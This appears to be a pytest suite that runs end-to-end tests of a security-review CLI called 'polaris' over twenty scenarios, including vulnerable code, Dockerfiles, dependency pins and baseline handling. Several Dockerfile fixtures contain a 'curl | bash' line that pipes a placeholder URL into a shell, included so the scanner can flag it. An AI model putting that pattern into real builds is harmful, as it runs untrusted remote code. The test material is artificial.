"""Comprehensive 20-Scenario End-to-End Real CLI Test Suite (GOAL 51 - Fase 5).

Validates polaris CLI via real subprocess calls across 20 distinct projects/scenarios:
1. Projeto Python limpo.
2. Projeto Python vulnerável.
3. Projeto com Dockerfile vulnerável.
4. Projeto com requirements vulnerável.
5. Projeto Node com package.json vulnerável.
6. Projeto com múltiplos scanners.
7. Projeto sem arquivos relevantes.
8. Projeto com diff grande.
9. Projeto com diff truncado.
10. Projeto com arquivos novos.
11. Projeto com arquivos excluídos.
12. Projeto com arquivos renomeados.
13. Projeto com erro de parsing de manifesto.
14. Projeto com política polaris.yaml inválida.
15. Projeto com baseline.json inválida.
16. Projeto com vulnerabilidades existentes na baseline.
17. Projeto com novas vulnerabilidades não presentes na baseline.
18. Projeto com vulnerabilidades corrigidas (resolvidas com cobertura).
19. Projeto com execução incompleta (estouro de orçamento sem falso PASS).
20. Projeto com resultados duplicados (deduplicação no baseline e SARIF).
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path


def _run_cmd(cmd: list[str], cwd: Path) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        cmd,
        cwd=str(cwd),
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )


def _init_repo(tmp_path: Path, name: str, with_initial_commit: bool = True) -> Path:
    repo = tmp_path / name
    repo.mkdir(parents=True, exist_ok=True)
    _run_cmd(["git", "init"], repo)
    _run_cmd(["git", "config", "user.name", "Tester"], repo)
    _run_cmd(["git", "config", "user.email", "tester@polaris.local"], repo)
    if with_initial_commit:
        base_file = repo / "README.md"
        base_file.write_text("# Initial Repo\n", encoding="utf-8")
        _run_cmd(["git", "add", "."], repo)
        _run_cmd(["git", "commit", "-m", "initial commit"], repo)
    return repo


def test_scenario_01_clean_python_project(tmp_path: Path):
    """1. Projeto Python limpo sem defeitos -> exit 0, 0 findings."""
    repo = _init_repo(tmp_path, "proj1")
    (repo / "calc.py").write_text("def add(a: int, b: int) -> int:\n    return a + b\n", encoding="utf-8")
    _run_cmd(["git", "add", "."], repo)
    _run_cmd(["git", "commit", "-m", "add calc"], repo)

    res = _run_cmd(["polaris", "review", "--provider", "fake", "--format", "json"], repo)
    assert res.returncode == 0
    data = json.loads(res.stdout)
    assert len(data["findings"]) == 0


def test_scenario_02_vulnerable_python_project(tmp_path: Path):
    """2. Projeto Python com divisão por zero no diff -> detectado."""
    repo = _init_repo(tmp_path, "proj2")
    (repo / "calc.py").write_text("def div(a, b):\n    return a + b\n", encoding="utf-8")
    _run_cmd(["git", "add", "."], repo)
    _run_cmd(["git", "commit", "-m", "base calc"], repo)

    (repo / "calc.py").write_text("def div(a, b):\n    return a / 0\n", encoding="utf-8")
    res = _run_cmd(["polaris", "review", "--provider", "fake", "--format", "json"], repo)
    assert res.returncode == 0
    data = json.loads(res.stdout)
    assert len(data["findings"]) == 1
    assert data["findings"][0]["category"] in ("boundary_condition", "correctness")


def test_scenario_03_vulnerable_dockerfile(tmp_path: Path):
    """3. Projeto com Dockerfile com curl | bash e base latest."""
    repo = _init_repo(tmp_path, "proj3")
    (repo / "Dockerfile").write_text("FROM python:latest\nRUN curl -sSL https://bad.url | bash\n", encoding="utf-8")
    res = _run_cmd(["polaris", "review", "--provider", "fake", "--format", "sarif"], repo)
    assert res.returncode == 0
    sarif = json.loads(res.stdout)
    rule_ids = {r["ruleId"] for r in sarif["runs"][0]["results"]}
    assert "INSECURE_CURL_BASH" in rule_ids or "UNPINNED_LATEST_TAG" in rule_ids


def test_scenario_04_vulnerable_requirements(tmp_path: Path):
    """4. Projeto com requirements vulnerável (requests 2.20.0 CVE-2018-18074)."""
    repo = _init_repo(tmp_path, "proj4")
    (repo / "requirements.txt").write_text("requests==2.20.0\n", encoding="utf-8")
    res = _run_cmd(["polaris", "review", "--provider", "fake", "--format", "sarif"], repo)
    assert res.returncode == 0
    sarif = json.loads(res.stdout)
    rule_ids = {r["ruleId"] for r in sarif["runs"][0]["results"]}
    assert "CVE-2018-18074" in rule_ids


def test_scenario_05_package_json(tmp_path: Path):
    """5. Projeto Node com package.json analisado deterministamente sem erro."""
    repo = _init_repo(tmp_path, "proj5")
    pkg = {"name": "app", "version": "1.0.0", "dependencies": {"lodash": "4.17.21"}}
    (repo / "package.json").write_text(json.dumps(pkg), encoding="utf-8")
    res = _run_cmd(["polaris", "review", "--provider", "fake"], repo)
    assert res.returncode == 0


def test_scenario_06_multi_scanner(tmp_path: Path):
    """6. Projeto combinando Code, Container e Supply Chain scanners em única execução."""
    repo = _init_repo(tmp_path, "proj6")
    (repo / "calc.py").write_text("x = 1 / 0\n", encoding="utf-8")
    (repo / "Dockerfile").write_text("FROM python:latest\nRUN curl -sSL https://bad | bash\n", encoding="utf-8")
    (repo / "requirements.txt").write_text("requests==2.20.0\n", encoding="utf-8")

    res = _run_cmd(["polaris", "review", "--provider", "fake", "--format", "sarif"], repo)
    assert res.returncode == 0
    sarif = json.loads(res.stdout)
    results = sarif["runs"][0]["results"]
    assert len(results) >= 3


def test_scenario_07_empty_irrelevant_files(tmp_path: Path):
    """7. Projeto com arquivos não suportados (ex: README.md)."""
    repo = _init_repo(tmp_path, "proj7")
    (repo / "README.md").write_text("# Documentation only\n", encoding="utf-8")
    res = _run_cmd(["polaris", "review", "--provider", "fake", "--format", "json"], repo)
    assert res.returncode == 0
    data = json.loads(res.stdout)
    assert data["status"] in ("empty_diff", "completed")


def test_scenario_08_and_09_budget_truncation(tmp_path: Path):
    """8 & 9. Execução com diff que excede budget de tokens -> status incompleto."""
    repo = _init_repo(tmp_path, "proj8")
    (repo / "calc.py").write_text("x = 1\n", encoding="utf-8")
    _run_cmd(["git", "add", "."], repo)
    _run_cmd(["git", "commit", "-m", "init calc"], repo)

    (repo / "calc.py").write_text("x = 1 / 0\n" * 50, encoding="utf-8")
    res = _run_cmd(["polaris", "review", "--provider", "fake", "--max-tokens", "100", "--format", "json"], repo)
    assert res.returncode == 0
    data = json.loads(res.stdout)
    assert data["status"] == "incomplete"
    assert any("BUDGET" in w["code"] for w in data["warnings"])


def test_scenario_10_new_files(tmp_path: Path):
    """10. Projeto com novo arquivo Python adicionado ao Git (staged)."""
    repo = _init_repo(tmp_path, "proj10")
    (repo / "new_module.py").write_text("def fn():\n    return 42 / 0\n", encoding="utf-8")
    _run_cmd(["git", "add", "new_module.py"], repo)
    res = _run_cmd(["polaris", "review", "--provider", "fake", "--format", "json"], repo)
    assert res.returncode == 0
    data = json.loads(res.stdout)
    assert len(data["findings"]) == 1


def test_scenario_11_deleted_files(tmp_path: Path):
    """11. Arquivo excluído não quebra o pipeline."""
    repo = _init_repo(tmp_path, "proj11")
    f = repo / "old.py"
    f.write_text("x = 1\n", encoding="utf-8")
    _run_cmd(["git", "add", "."], repo)
    _run_cmd(["git", "commit", "-m", "init"], repo)

    f.unlink()
    res = _run_cmd(["polaris", "review", "--provider", "fake", "--format", "json"], repo)
    assert res.returncode == 0


def test_scenario_12_renamed_files(tmp_path: Path):
    """12. Arquivo renomeado com defeito adicionado."""
    repo = _init_repo(tmp_path, "proj12")
    (repo / "orig.py").write_text("x = 1\n", encoding="utf-8")
    _run_cmd(["git", "add", "."], repo)
    _run_cmd(["git", "commit", "-m", "init"], repo)

    _run_cmd(["git", "mv", "orig.py", "renamed.py"], repo)
    (repo / "renamed.py").write_text("x = 1 / 0\n", encoding="utf-8")

    res = _run_cmd(["polaris", "review", "--provider", "fake", "--format", "json"], repo)
    assert res.returncode == 0


def test_scenario_13_malformed_manifest_handled_gracefully(tmp_path: Path):
    """13. Manifest com formato corrompido não aborta a análise."""
    repo = _init_repo(tmp_path, "proj13")
    (repo / "package.json").write_text("INVALID JSON NOT A DICT {", encoding="utf-8")
    (repo / "calc.py").write_text("x = 1 / 0\n", encoding="utf-8")
    res = _run_cmd(["polaris", "review", "--provider", "fake"], repo)
    assert res.returncode == 0


def test_scenario_14_invalid_polaris_yaml_fallback(tmp_path: Path):
    """14. polaris.yaml malformado faz fallback seguro para default sem crash."""
    repo = _init_repo(tmp_path, "proj14")
    (repo / "polaris.yaml").write_text("policy: [not a dict", encoding="utf-8")
    (repo / "calc.py").write_text("x = 1 / 0\n", encoding="utf-8")
    res = _run_cmd(["polaris", "review", "--provider", "fake"], repo)
    assert res.returncode == 0


def test_scenario_15_invalid_baseline_file(tmp_path: Path):
    """15. Arquivo de baseline corrompido retorna exit code 2 (CONFIGURATION_ERROR)."""
    repo = _init_repo(tmp_path, "proj15")
    bad_bl = repo / "bad_baseline.json"
    bad_bl.write_text("{ corrupt json", encoding="utf-8")
    res = _run_cmd(["polaris", "review", "--provider", "fake", "--baseline", str(bad_bl)], repo)
    assert res.returncode == 2
    assert "Error loading baseline" in res.stderr


def test_scenario_16_17_18_baseline_lifecycle(tmp_path: Path):
    """16, 17 & 18. Ciclo completo de baseline: EXISTING, NEW, e RESOLVED com cobertura."""
    repo = _init_repo(tmp_path, "proj16")
    calc = repo / "calc.py"
    calc.write_text("x = 1\n", encoding="utf-8")
    _run_cmd(["git", "add", "."], repo)
    _run_cmd(["git", "commit", "-m", "init calc"], repo)

    calc.write_text("x = 1 / 0\n", encoding="utf-8")
    bl_file = repo / "base.json"

    # Salva baseline com defeito inicial
    _run_cmd(["polaris", "review", "--provider", "fake", "--save-baseline", str(bl_file)], repo)
    assert bl_file.is_file()

    # Re-executa contra baseline: EXISTING = 1, NEW = 0
    res1 = _run_cmd(["polaris", "review", "--provider", "fake", "--baseline", str(bl_file), "--format", "json"], repo)
    data1 = json.loads(res1.stdout)
    assert data1["baseline_comparison"]["counts"]["existing"] == 1
    assert data1["baseline_comparison"]["counts"]["new"] == 0

    # Corrige calc.py (bug eliminado) e commita para garantir escopo limpo
    calc.write_text("x = 1 + 1\n", encoding="utf-8")
    _run_cmd(["git", "add", "."], repo)
    _run_cmd(["git", "commit", "-m", "fix calc"], repo)

    # Introduz diff na linha corrigida
    calc.write_text("x = 1 + 2\n", encoding="utf-8")
    res2 = _run_cmd(["polaris", "review", "--provider", "fake", "--baseline", str(bl_file), "--format", "json"], repo)
    data2 = json.loads(res2.stdout)
    assert data2["baseline_comparison"]["counts"]["resolved"] == 1
    assert data2["baseline_comparison"]["counts"]["existing"] == 0


def test_scenario_19_incomplete_execution_blocks_false_resolved(tmp_path: Path):
    """19. Em análise incompleta, o motor nunca declara vulnerabilidades como resolvidas."""
    repo = _init_repo(tmp_path, "proj19")
    calc = repo / "calc.py"
    calc.write_text("x = 1\n", encoding="utf-8")
    _run_cmd(["git", "add", "."], repo)
    _run_cmd(["git", "commit", "-m", "init calc"], repo)

    calc.write_text("x = 1 / 0\n", encoding="utf-8")
    bl_file = repo / "base.json"
    _run_cmd(["polaris", "review", "--provider", "fake", "--save-baseline", str(bl_file)], repo)

    # Modifica calc.py com conteúdo grande e força estouro de token budget
    calc.write_text("x = 1 / 0\n" * 40, encoding="utf-8")
    res = _run_cmd(["polaris", "review", "--provider", "fake", "--max-tokens", "50", "--baseline", str(bl_file), "--format", "json"], repo)
    data = json.loads(res.stdout)
    assert data["status"] == "incomplete"
    assert data["baseline_comparison"]["counts"]["resolved"] == 0


def test_scenario_20_duplicate_findings_deduplication(tmp_path: Path):
    """20. SARIF e Baseline mantêm deduplicação estrita de regras e achados idênticos."""
    repo = _init_repo(tmp_path, "proj20")
    (repo / "Dockerfile").write_text("FROM python:latest\nRUN curl -sSL http://bad | bash\n", encoding="utf-8")
    bl_file = repo / "base.json"
    _run_cmd(["polaris", "review", "--provider", "fake", "--save-baseline", str(bl_file)], repo)

    with open(bl_file, encoding="utf-8") as f:
        data = json.load(f)
    fingerprints = [item["stable_fingerprint"] for item in data["findings"]]
    assert len(fingerprints) == len(set(fingerprints))
